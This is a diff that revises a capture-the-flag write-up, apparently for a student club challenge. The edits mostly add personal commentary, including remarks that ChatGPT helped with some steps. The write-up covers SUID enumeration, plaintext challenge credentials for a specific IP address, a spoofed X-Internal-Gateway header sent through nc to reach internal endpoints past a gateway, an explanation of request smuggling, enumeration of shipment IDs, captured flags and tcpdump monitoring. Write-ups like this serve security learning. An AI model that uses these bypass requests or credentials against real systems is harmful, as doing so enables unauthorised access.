@@ -110,13 +110,13 @@ Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCL
 # Phasewise workflow for the flag capture:
 
 ### Initial Enumeration
-Commands executed:
+Executed the following commands:
 
 ```bash
-whoami
-pwd
-ls
-ls -la
+whoami - For checking the server
+pwd - The location of the file 
+ls - listing all the files
+ls -la - listing all the files along with the hidden ones. 
 ```
 
 ### Results
@@ -139,11 +139,11 @@ The environment appeared to be:
 - Containerized
 - Linux-based
 - Restricted
-- Running with minimal environment variables
+- Running with minimal environment variables as many of the commands were not working and were not present on the system. 
 
 ---
 
-## 1. SUID Enumeration
+## 1. SUID Enumeration - Took the help of this as was thinking that something was from the owner side was not giving the permission. With the help of SUID we gained the root - level file access. 
 
 ### Filesystem Enumeration
 ```bash
@@ -151,7 +151,7 @@ find / -perm -4000 2>/dev/null
 ```
 
 ### Discovery
-The following binary was discovered:
+The following binary was discovered: This is giving the visible path (From this point to the discovery of the root flag I also used ChatGPT)
 
 ```text
 /usr/local/bin/secure_reader
@@ -277,9 +277,9 @@ pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
 168.144.73.17:8003
 analyst:Fr8_4nalyst!
 ```
-# Step 34 — Moving Toward EuroFreight Infrastructure
+## Moving Toward EuroFreight Infrastructure, as it was also mentioned in the data along with the login option after getting the first flag. 
 
-Using the discovered credentials, investigation shifted toward:
+Using the discovered credentials, investigation shifted toward the link provided:
 
 ```text
 http://168.144.73.17:8003
@@ -287,9 +287,9 @@ http://168.144.73.17:8003
 
 ---
 
-# Step 35 — Investigating Session Cookies
+## Investigating Session Cookies
 
-A suspicious session cookie was identified:
+A suspicious session cookie was identified, I looked around the DevTools and found under the network tab, under the response header secation a suspecious cookie. This cookie was encoded in the form of the base 64 :
 
 ```text
 session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY
@@ -303,7 +303,7 @@ Decoding revealed:
 
 ---
 
-# Step 36 — Attempting Direct Internal Access
+## Attempted Direct Internal Access
 
 Request:
 
@@ -321,29 +321,28 @@ returned:
 
 ---
 
-# Step 37 — Hypothesizing Gateway Filtering
+## Hypothesizing Gateway Filtering
 
 Observation:
 - gateway protections blocked internal endpoints.
 
-Hypothesis:
-- raw HTTP requests might bypass the filtering logic.
+Then, thought that the raw HTTP requests might bypass the filtering logic.
 
 ---
 
-# Step 38 — Using Raw HTTP Requests
+## Using Raw HTTP Requests
 
-Command:
+The command for the above stated task was:
 
 ```bash
 printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
 ```
 
-successfully bypassed protections.
+This successfully bypassed protections and the response gave the second flag in the journey.
 
 ---
 
-# Step 39 — Discovering the Second Flag
+## Discovering the Second Flag
 
 Response:
 
@@ -357,7 +356,7 @@ Response:
 
 ---
 
-# Step 40 — Discovering API Documentation
+## Now, moving towards the dicovery of the third flag, checking the API Documentation
 
 Further exploration revealed:
 
@@ -372,7 +371,7 @@ The endpoint documented:
 
 ---
 
-# Step 41 — Discovering Chunked Transfer Support
+## Discovering Chunked Transfer Support
 
 The documentation explicitly mentioned:
 
@@ -382,10 +381,12 @@ chunked transfer supported
 
 This strongly suggested:
 - request smuggling opportunities.
+**Smuggling** - Request Smuggling is a web attack technique where an attacker exploits differences in how frontend and backend servers parse HTTP requests, allowing hidden or unintended requests to be processed internally.
 
+With the help of this method we want a way to sneak requests past the gateway. 
 ---
 
-# Step 42 — Testing Chunked Uploads
+## Testing Chunked Uploads
 
 Chunked transfer test:
 
@@ -401,7 +402,7 @@ returned:
 
 ---
 
-# Step 43 — Accessing the Dashboard
+## Accessing the Dashboard
 
 Dashboard access:
 
@@ -415,7 +416,7 @@ revealed:
 
 ---
 
-# Step 44 — Identifying a Suspicious Shipment
+# Step 44 — Identifying a Suspicious Shipment - This was also visible and found after logging on to the website. (From this point to the fidning of the third flag I also used ChatGPT)
 
 One shipment stood out:
 
@@ -431,7 +432,7 @@ HELD — ADMIN CLEARANCE REQUIRED
 
 ---
 
-# Step 45 — Enumerating Shipment IDs
+## Enumerating Shipment IDs
 
 Additional shipment IDs tested:
 - BERLIN-NOV08
@@ -443,7 +444,7 @@ All returned:
 
 ---
 
-# Step 46 — Accessing Shipment Details
+## Accessing Shipment Details - This thought came as there might be something inside each of the shipments: 
 
 Request:
 
@@ -451,7 +452,7 @@ Request:
 printf 'GET http://127.0.0.1/shipments/BERLIN-NOV07 HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
 ```
 
-revealed:
+After searching for the first shipment found the third flag in the way: 
 
 ```text
 PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
@@ -459,7 +460,7 @@ PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
 
 ---
 
-# Step 47 — Discovering the Third Flag
+## Discovering the Third Flag
 
 Recovered flag:
 
@@ -544,6 +545,33 @@ produced:
 ---
 
 # Step 54 — Monitoring Traffic Using tcpdump
+
+Traffic monitoring:
+
+```bash
+sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
+```
+
+revealed:
+- TCP acknowledgements,
+- payload acceptance,
+- no visible response traffic.
+
+This suggested:
+- telemetry sink,
+- signaling endpoint,
+- or silent infrastructure listener.
+
+---
+
+## Service Fingerprinting of the Port 8008
+
+This is trying to identify the following this on this port: - 
+- the actual service,
+- hidden HTTP behavior,
+- banners,
+- TLS hints,
+-   protocol fingerprints.
 
 Traffic monitoring:
 
